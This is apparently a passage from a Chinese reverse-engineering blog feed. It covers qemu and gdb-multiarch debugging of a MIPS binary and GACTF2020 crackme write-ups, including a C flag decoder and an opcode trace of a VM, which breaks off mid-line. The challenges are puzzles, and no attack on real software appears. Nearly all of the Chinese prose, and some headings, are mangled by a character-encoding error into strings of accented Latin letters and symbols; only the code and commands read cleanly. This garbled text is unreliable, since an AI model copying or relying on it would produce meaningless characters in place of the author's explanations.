</a></p><p>é¦–å…ˆæœç´¢ç›¸å…³åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search <span class="string">"libc6"</span> | grep mips</span><br></pre></td></tr></table></figure><p><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919101836969.png" alt="image-20200919101836969"></p><p>è¿™é‡Œæˆ‘ä»¬å®‰è£…ç¨‹åºéœ€è¦çš„å°±è¡Œã€‚æˆ‘ä¸ºäº†ä»¥åæ–¹ä¾¿å°†64ä½ä¸32ä½çš„å¤§å°ç«¯mipsç¨‹åºçš„å…±äº«åº“éƒ½è£…äº†ï¼š<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919102119629.png" alt="image-20200919102119629"></p><p>ç„¶åè¿è¡ŒåŠ¨æ€é“¾æ¥çš„ç¨‹åºè¦ä½¿ç”¨å®Œæ•´çš„å‘½ä»¤ä¸”æŒ‡æ˜å…±äº«åº“è·¯å¾„ï¼š<strong>-L æŒ‡æ˜å…±äº«åº“è·¯å¾„</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./maze</span><br></pre></td></tr></table></figure><p>ä½†è¿™é“é¢˜çš„mazeå´è¿è¡Œä¸äº†ï¼Œæç¤ºï¼š<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919102554822.png" alt="image-20200919102554822"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä»–æç¤º/bin/ld-musl-mipsel-sf.so.1ä¸å­˜åœ¨ã€‚è€Œè¿™æ˜¯ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œè€Œé¢˜ç›®ç»™äº†æ–‡ä»¶ç³»ç»Ÿçš„ã€‚æ‰€ä»¥æ‰¾åˆ°ä¹‹å‰è§£å‹çš„.ext4æ–‡ä»¶ï¼Œæœç„¶æ‰/bin/ç›®å½•ä¸‹å‘ç°ld-musl-mips-sf.so.1ã€‚æ‰€ä»¥è¿™ä¸ªçš„mipsçš„ç¨‹åºåº”è¯¥æ˜¯æŒ‡å®šäº†å…±äº«åº“çš„è·¯å¾„äº†ï¼Œæˆ‘ä»¬å®‰è£…32ä½å°ç«¯å…±äº«åº“è‡ªç„¶ä¸è¡Œã€‚</p><p>æ‰€ä»¥æœ¬é¢˜çš„ç¨‹åºè¦åˆ©ç”¨æ‰€ç»™çš„å…±äº«åº“ï¼Œæ¥ä¸‹æ¥æŠŠlibæ–‡ä»¶å¤¹æ”¾åœ¨ä¸mazeåŒä¸€çº§çš„ç›®å½•ä¸‹ï¼Œç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L ./ ./maze</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯æŠ¥é”™ã€‚ã€‚ä½†è¿™æ¬¡æ˜¯å…±äº«åº“å­˜åœ¨äº†ã€‚ã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919103541134.png" alt="image-20200919103541134"></p><p>æœ€ååœ¨çœ‹å‘è¿™ä¸ªé¢˜çš„å¸ˆå‚…çš„å¸–å­é‡Œçœ‹åˆ°ä¸€ä¸ªæ–¹æ³•ï¼šä¹Ÿå°±æ˜¯æˆ‘ä¸Šé¢æ‰§è¡Œå¤±è´¥çš„è§£å†³åŠæ³•ã€‚</p><p>æ‰¾åˆ°/lib/ä¸‹çš„2ä¸ªæ–‡ä»¶ï¼š<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919104238399.png" alt="image-20200919104238399"></p><p>æˆ‘çš„ç†è§£æ˜¯åƒé“¾è¡¨ä¸€æ ·é€šè¿‡ä¸€ä¸ªæ–‡ä»¶æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ã€‚è¿™æ ·ä¼šå¯¼è‡´æˆ‘ä»¬åœ¨æ‰€ç»™ç³»ç»Ÿå¤–æ‰§è¡Œè¯¥ç¨‹åºï¼Œè§£æå¤±è´¥ã€‚è§£å†³åŠæ³•ï¼š</p><p>ç›´æ¥åˆ é™¤åŸæ–‡ä»¶ï¼Œå°†æ‰€æŒ‡çš„2ä¸ªæ–‡ä»¶ï¼Œé‡å‘½åä¸ºæŒ‡å‘ä»–ä»¬æ–‡ä»¶çš„åç§°ã€‚<strong>ä¹Ÿå°±æ˜¯ld-musl-mipsel-sf.so.1åˆ é™¤ï¼Œlibc.soé‡åä¸ºld-musl-mipsel-sf.so.1ï¼Œå¦å¤–ä¸€ä¸ªæ–‡ä»¶åŒç„¶çš„æ“ä½œã€‚</strong></p><p>ç„¶åæ‰§è¡ŒæˆåŠŸã€‚<strong>å½“ç„¶å¯¹äºç›´æ¥ç»™çš„ä¸€ä¸ªmipsç¨‹åºï¼Œæˆ‘ä»¬ç”¨æŒ‡å®šçš„qemuå‘½ä»¤å¹¶æŒ‡æ˜å…±äº«åº“å°±å¯ä»¥æ‰§è¡Œçš„äº†ã€‚è¦æ˜¯å…¶ä»–æ¶æ„çš„ç¨‹åºä½¿ç”¨ç›¸åº”çš„å‘½ä»¤å³å¯</strong></p><p>ä¸ºäº†è°ƒè¯•ï¼Œæˆ‘ä»¬æŒ‡å®šæŸä¸€ä¸ªç«¯å£å¼€ä¸€ä¸ªGDBè°ƒè¯•ï¼ˆ-g portï¼‰ã€‚</p><p>å› ä¸ºä»¥å‰idaåŠ¨è°ƒç«¯å£å·éƒ½æ˜¯23946ï¼Œè¿™é‡Œä¸ºäº†idaåŠ¨è°ƒæ–¹ä¾¿ä¹Ÿç”¨è¿™ä¸ªã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919105704723.png" alt="image-20200919105704723"></p><p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹è°ƒè¯•äº†ï¼Œä½¿ç”¨gdbä¸idaéƒ½å¯ä»¥ã€‚</p><p>é¦–å…ˆgdbï¼š</p><ol><li>å®‰è£…<strong>apt-get install gdb-multiarch</strong></li><li><strong>gdb-multiarch -q ./bin/maze</strong></li><li><strong>set architecture mips</strong>ï¼ˆè®¾ç½®å¥½è°ƒè¯•ç¨‹åºçš„æ¶æ„ï¼‰</li><li><strong>set endian little</strong>ï¼ˆè®¾ç½®ç¨‹åºçš„å¤§å°ç«¯ï¼‰</li><li>è¿œç¨‹è¿æ¥è°ƒè¯•ç«¯å£ <strong>target remote :23946</strong>ï¼ˆæœ¬åœ°å¯ä»¥ä¸å†™ipï¼Œ127.0.0.1ï¼‰</li></ol><p>idaï¼šä¸ä¹‹å‰çš„idaçš„<strong>Remote linux debugger</strong>ç±»ä¼¼ã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919110620683.png" alt="image-20200919110620683"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;å¾çˆ±å¸ˆå‚…å‘äº†ä¸€ç¯‡å…³äºmipsç¨‹åºçš„é€†å‘ï¼Œåˆšæ¥è§¦é€†å‘é‡åˆ°è¿‡ä½†éƒ½è·³è¿‡äº†ï¼Œè¿™æ¬¡é‡åˆ°æ­£å¥½è¶æ­¤å­¦ä¹ ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>GACTF2020</title>
    <link href="https://www.bxnop.cn/2020/08/30/GACTF2020/"/>
    <id>https://www.bxnop.cn/2020/08/30/GACTF2020/</id>
    <published>2020-08-30T09:25:54.000Z</published>
    <updated>2020-09-14T11:14:29.231Z</updated>
    
    <content type="html"><![CDATA[<p>åšäº†2ä¸ªé€†å‘åŠæ‚é¡¹è¿˜æ˜¯æœ‰æ”¶è·ã€‚<a id="more"></a></p><h2 id="Reverseï¼š"><a href="#Reverseï¼š" class="headerlink" title="Reverseï¼š"></a>Reverseï¼š</h2><h3 id="WannaFlag"><a href="#WannaFlag" class="headerlink" title="WannaFlag"></a>WannaFlag</h3><p>æ‰“å¼€ç¨‹åºï¼Œç‚«é…·çš„ç•Œé¢å’ŒéŸ³ä¹ã€‚å…¶å®å°±æ˜¯ä¸€ä¸ªCrackeMeã€‚<img src="/2020/08/30/GACTF2020/image-20200913175304433.png" alt="image-20200913175304433"></p><p>è½½å…¥idaï¼Œç›´æ¥å®šä½åˆ°GetwindowTextæˆ–è€…GetDlgItemTextå‡½æ•°ã€‚<img src="/2020/08/30/GACTF2020/image-20200913174317321.png" alt="image-20200913174317321"></p><p>å…³é”®å°±æ˜¯é‚£ä¸ªå¤æ‚çš„ifè¯­å¥æ ¹æœ¬å°±æ‰§è¡Œä¸åˆ°ï¼Œç›´æ¥è·³è¿‡ã€‚</p><p>å¯¹inputè¿›è¡Œäº†xorä¸roræ“ä½œã€‚ç›´æ¥é€†å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">78</span>, <span class="number">174</span>,  <span class="number">97</span>, <span class="number">186</span>, <span class="number">228</span>,  <span class="number">43</span>,  <span class="number">85</span>, <span class="number">170</span>,  <span class="number">89</span>, <span class="number">252</span>, </span><br><span class="line">   <span class="number">77</span>,   <span class="number">2</span>,  <span class="number">23</span>, <span class="number">107</span>,  <span class="number">19</span>, <span class="number">161</span>,  <span class="number">65</span>, <span class="number">254</span>,  <span class="number">53</span>,  <span class="number">11</span>, </span><br><span class="line">  <span class="number">180</span>,  <span class="number">11</span>,  <span class="number">82</span>,  <span class="number">47</span>,  <span class="number">70</span>, <span class="number">204</span>,  <span class="number">53</span>, <span class="number">130</span>, <span class="number">229</span>, <span class="number">136</span>, </span><br><span class="line">   <span class="number">80</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v37 = <span class="number">6</span>, v38 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> i, j, len = <span class="number">31</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"ANNAWGALFYBKVIAHMXTFCAACLAAAAYK"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt; v37; i++)</span><br><span class="line">v38 *= i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp = i%<span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> ans = ((ida_[i] &gt;&gt; temp) | (ida_[i]&amp;((<span class="keyword">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, temp)<span class="number">-1</span>)) &lt;&lt; <span class="number">8</span>-temp) ^ s[i]; <span class="comment">//rol</span></span><br><span class="line"><span class="built_in">putchar</span>(ans ^ v38);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//wannaflag_is_just_a_paper_tiger</span></span><br></pre></td></tr></table></figure><p>æœ€åå°†å…¶è¾“å…¥ç¨‹åºçš„è¾“å…¥æ¡†ï¼Œæ‰“å¼€è§£å¯†åçš„flagæ–‡ä»¶å¾—åˆ°flagã€‚<img src="/2020/08/30/GACTF2020/image-20200913174837508.png" alt="image-20200913174837508"></p><h3 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h3><p>idaæ‰“å¼€åï¼Œmainå‡½æ•°sp-analysis failedï¼Œç®€å•ä¿®å¤ä¸€ä¸‹æ ˆæŒ‡é’ˆå°±è¡Œã€‚</p><p><img src="/2020/08/30/GACTF2020/image-20200913182620575.png" alt="image-20200913182620575"></p><p>æ¥åˆ°mainå‡½æ•°ï¼Œé¦–å…ˆæ˜¯è¾“å…¥ä¸€ä¸ªæ•´å‹æ•°æ®ï¼Œä»äº¤å‰å¼•ç”¨å‘ç°å¯¹è¯¥æ•°æ®åé¢å¹¶æ²¡æœ‰ä½¿ç”¨ï¼ŒçŒœæµ‹å¯¹å‡½æ•°ä»£ç æœ‰ä¸€ä¸ªè§£å¯†è¿‡ç¨‹ã€‚å‘ç°åé¢æœ‰ä¸€ä¸ª<strong>mprotect()</strong>å‡½æ•°ä¿®æ”¹æŒ‡å®šå†…å­˜ä¿æŠ¤å±æ€§ï¼Œå³æŠŠè¦è§£å¯†çš„ä»£ç çš„å†…å­˜æ”¹ä¸ºå¯å†™ã€‚æ¥ç€çš„å‡½æ•°å®ç°è§£å¯†ä¸€ä¸ªå‡½æ•°ä»£ç åŠŸèƒ½ã€‚</p><p>åŠ¨è°ƒæ¥åˆ°è§£å¯†çš„å‡½æ•°ï¼ˆè¿™é‡Œæˆ‘ä¹Ÿåå¤ä¿®äº†å‡ æ¬¡ï¼Œæ‰å®Œç¾çš„F5ï¼‰ï¼šä¸€ä¸ªVMä¸”å‰é¢å·²ç»ç”³è¯·äº†å­˜æ”¾æ•°æ®çš„å†…å­˜ç©ºé—´å’Œåˆå§‹åŒ–ã€‚<img src="/2020/08/30/GACTF2020/image-20200913183634163.png" alt="image-20200913225646159"></p><p>å¼€å§‹æ˜¯å•æ­¥è°ƒè¯•ï¼Œç”±äºåˆ†æ”¯æ¯”è¾ƒå¤šï¼Œåé¢å°†æ•´ä¸ªå‡½æ•°ä¸opcodeå¤åˆ¶åˆ°Cè¯­è¨€ç¼–è¯‘å™¨ï¼Œæ‰“å°å‡ºå‡½æ•°æ ¹æ®opcodeçš„æ‰§è¡Œæƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">13</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">2029229568</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">17</span></span><br><span class="line">a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">-2049703936</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">19</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] == <span class="number">653840640</span> ) <span class="built_in">exit</span>(<span class="number">0</span>) <span class="comment">//é¦–å…ˆæ ¹æ®è¾“å…¥çš„æ•´å‹æ•°æ®ç»è¿‡è¿ç®—åä¸æŒ‡å®šå€¼è¿›è¡Œæ¯”è¾ƒï¼Œä¸æ­£ç¡®åˆ™é€€å‡ºã€‚</span></span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input <span class="comment">//ä¸‹é¢ä¾æ¬¡ä½¿ç”¨è¾“å…¥çš„æ•´å‹æ•°æ®ç»è¿‡è¿ç®—åå­˜æ”¾å…¥dword_804B2A0æ•°ç»„ã€‚</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">3</span>] = <span class="number">2</span></span><br><span class="line">a1[<span class="number">1</span>] *= a1[<span class="number">3</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">0</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">8</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">5</span>] = <span class="number">7</span></span><br><span class="line">a1[<span class="number">1</span>] /= a1[<span class="number">5</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">33</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">1</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">16</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">9</span>] = <span class="number">187</span></span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">2</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = <span class="number">10000</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">4</span>] = <span class="number">160</span></span><br><span class="line">a1[<span class="number">1</span>] -= a1[<span class="number">4</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">119</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">3</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag:"</span>) <span class="comment">//è¾“å…¥flag</span></span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">0</span>] <span class="comment">//ä¸‹é¢ä¾æ¬¡å¯¹è¾“å…¥çš„flagçš„æ¯ä¸€ä½ä¸dword_804B2A0ä¸­çš„æ•°æ®å¼‚æˆ–ï¼Œ</span></span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>] </span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">267</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)  <span class="comment">//å¹¶ä¸æŒ‡å®šæ•°æ®æ¯”è¾ƒï¼Œä¸ç›¸ç­‰åˆ™é€€å‡ºã€‚</span></span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">122</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">149</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">3</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">262</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">4</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">125</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">5</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">173</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">6</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">303</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>]</span><br><span class="line">a1[<span class="number">9</span>] = 